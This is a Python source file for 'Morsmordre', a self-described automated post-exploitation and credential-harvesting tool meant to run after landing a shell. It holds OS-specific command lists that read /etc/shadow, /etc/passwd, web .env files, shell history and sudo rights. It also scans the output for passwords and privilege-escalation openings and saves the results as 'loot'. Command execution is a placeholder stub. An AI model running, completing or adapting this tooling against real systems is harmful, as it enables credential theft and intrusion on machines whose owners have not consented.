#!/usr/bin/env python3
"""
Morsmordre v1.0 - Red Engine
Automated Post-Exploitation & Credential Harvesting
Activates immediately upon shell landing
"""

import os
import sys
import json
import asyncio
import time
from datetime import datetime
from typing import List, Dict, Optional
from dataclasses import dataclass, asdict

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.live import Live
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

@dataclass
class Loot:
    timestamp: str
    category: str
    data: str
    source: str

class Morsmordre:
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        self.target = os.getenv('MORSMORDRE_TARGET', 'unknown')
        self.os = os.getenv('MORSMORDRE_OS', 'Linux')
        self.loot: List[Loot] = []
        self.commands_executed = 0
        
    def banner(self):
        if self.console:
            self.console.print(Panel.fit(
                "[bold red]Morsmordre v1.0 - Red Engine[/bold red]",
                subtitle="[red]Automated Enumeration Dashboard[/red]",
                border_style="red"
            ))
        else:
            print("\033[91m>>> Morsmordre v1.0 - The Finish Line <<<\033[0m")
    
    def log(self, msg: str, level: str = "info"):
        ts = datetime.now().strftime("%H:%M:%S")
        if self.console:
            color = {"info": "blue", "loot": "green", "cmd": "yellow", "error": "red"}.get(level, "white")
            self.console.print(f"[{color}][{ts}] {msg}[/{color}]")
        else:
            print(f"[{ts}] {msg}")
    
    def get_enumeration_commands(self) -> List[Dict]:
        """OS-specific automated enumeration"""
        if self.os == "Windows":
            return [
                {"cmd": "whoami", "desc": "Current user", "type": "identity"},
                {"cmd": "whoami /priv", "desc": "Privileges", "type": "privesc"},
                {"cmd": "systeminfo", "desc": "System info", "type": "system"},
                {"cmd": "net user", "desc": "Local users", "type": "users"},
                {"cmd": "net localgroup administrators", "desc": "Admins", "type": "users"},
                {"cmd": "tasklist /v", "desc": "Processes", "type": "processes"},
                {"cmd": "ipconfig /all", "desc": "Network config", "type": "network"},
                {"cmd": "type C:\\Windows\\System32\\drivers\\etc\\hosts", "desc": "Hosts file", "type": "network"},
                {"cmd": "dir /s C:\\Users\\*.txt", "desc": "Text files", "type": "files"},
                {"cmd": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "desc": "Persistence", "type": "persistence"}
            ]
        else:  # Linux
            return [
                {"cmd": "id", "desc": "Current user", "type": "identity"},
                {"cmd": "whoami", "desc": "Username", "type": "identity"},
                {"cmd": "uname -a", "desc": "Kernel info", "type": "system"},
                {"cmd": "cat /etc/passwd", "desc": "User accounts", "type": "users"},
                {"cmd": "cat /etc/shadow 2>/dev/null || echo 'Permission denied'", "desc": "Password hashes", "type": "credentials"},
                {"cmd": "sudo -l", "desc": "Sudo privileges", "type": "privesc"},
                {"cmd": "ps aux", "desc": "Processes", "type": "processes"},
                {"cmd": "netstat -tulpn 2>/dev/null || netstat -tuln", "desc": "Network connections", "type": "network"},
                {"cmd": "ip addr", "desc": "Interfaces", "type": "network"},
                {"cmd": "find / -perm -4000 -type f 2>/dev/null", "desc": "SUID files", "type": "privesc"},
                {"cmd": "cat /etc/crontab", "desc": "Cron jobs", "type": "persistence"},
                {"cmd": "ls -la /home", "desc": "Home directories", "type": "users"},
                {"cmd": "cat /var/www/html/.env 2>/dev/null || echo 'No .env'", "desc": "Web config", "type": "credentials"},
                {"cmd": "history", "desc": "Command history", "type": "credentials"}
            ]
    
    async def execute_and_capture(self, cmd: str) -> str:
        """Execute command through shell and capture output"""
        # In real implementation, this writes to the shell's stdin and reads stdout
        # For now, placeholder that would interface with the socket
        self.commands_executed += 1
        return f"[Output of: {cmd}]"
    
    def save_loot(self):
        """Serialize all loot to JSON"""
        filename = f"morsmordre_{self.target.replace('.', '_')}_{datetime.now().strftime('%H%M%S')}.json"
        data = {
            "target": self.target,
            "os": self.os,
            "timestamp": datetime.now().isoformat(),
            "commands_executed": self.commands_executed,
            "loot": [asdict(l) for l in self.loot]
        }
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        self.log(f"Loot saved: {filename}", "loot")
    
    def display_dashboard(self):
        """Real-time loot dashboard"""
        if not self.console:
            return
            
        table = Table(title=f"Morsmordre Dashboard - {self.target}")
        table.add_column("Time", style="cyan")
        table.add_column("Category", style="magenta")
        table.add_column("Source", style="yellow")
        table.add_column("Data", style="green")
        
        for item in self.loot[-10:]:  # Last 10 items
            table.add_row(
                item.timestamp,
                item.category,
                item.source,
                item.data[:50] + "..." if len(item.data) > 50 else item.data
            )
        
        return Panel(table, border_style="red")
    
    async def run_autonomous(self):
        """Main autonomous enumeration loop"""
        self.banner()
        self.log(f"Target: {self.target} | OS: {self.os}", "info")
        self.log("Beginning autonomous enumeration...", "cmd")
        
        commands = self.get_enumeration_commands()
        
        for idx, cmd_info in enumerate(commands):
            self.log(f"[{idx+1}/{len(commands)}] {cmd_info['desc']}: {cmd_info['cmd']}", "cmd")
            
            # Execute (placeholder - real implementation uses the socket)
            output = await self.execute_and_capture(cmd_info['cmd'])
            
            # Parse for credentials/loot
            if "password" in output.lower() or "hash" in output.lower():
                self.loot.append(Loot(
                    timestamp=datetime.now().isoformat(),
                    category="credentials",
                    data=output[:500],
                    source=cmd_info['cmd']
                ))
                self.log("CREDENTIALS FOUND!", "loot")
            
            if "sudo" in output and "NOPASSWD" in output:
                self.loot.append(Loot(
                    timestamp=datetime.now().isoformat(),
                    category="privesc",
                    data=output[:500],
                    source=cmd_info['cmd']
                ))
                self.log("PRIVESC VECTOR FOUND!", "loot")
        
        self.save_loot()
        self.log("Autonomous enumeration complete", "loot")

def main():
    morsmordre = Morsmordre()
    asyncio.run(morsmordre.run_autonomous())

if __name__ == "__main__":
    main()